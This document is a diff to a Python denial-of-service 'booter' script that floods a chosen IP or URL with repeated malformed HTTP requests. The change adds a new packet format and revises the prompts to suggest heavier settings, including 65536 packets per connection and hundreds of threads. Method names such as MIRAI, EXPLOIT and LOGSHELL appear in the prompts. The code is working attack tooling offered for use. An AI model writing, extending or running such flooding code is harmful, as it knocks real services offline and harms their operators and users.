@@ -53,6 +53,8 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
         elif data_type_loader_packet == 'OWN2':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
+        elif data_type_loader_packet == 'OWN3':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
@@ -101,18 +103,18 @@ banner = f"""
 print(banner)
 host = ""
 ip = ""
-print(f"{Fore.LIGHTWHITE_EX}PYF OWN1 OWN2")
-data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF)>").upper()
+print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-3")
+data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)>").upper()
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
 port_loader = int(input(f"{Fore.YELLOW}PORT>"))
 time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 299)>"))
+spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 EXAMPLE=299)>"))
 create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)>"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500 EXAMPLE=65536)>"))
 print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
 print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
 methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>").upper()
-spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}SPAM CREATE THREAD (DEFAULT=5)>"))
+spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}SPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15)>"))
 print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
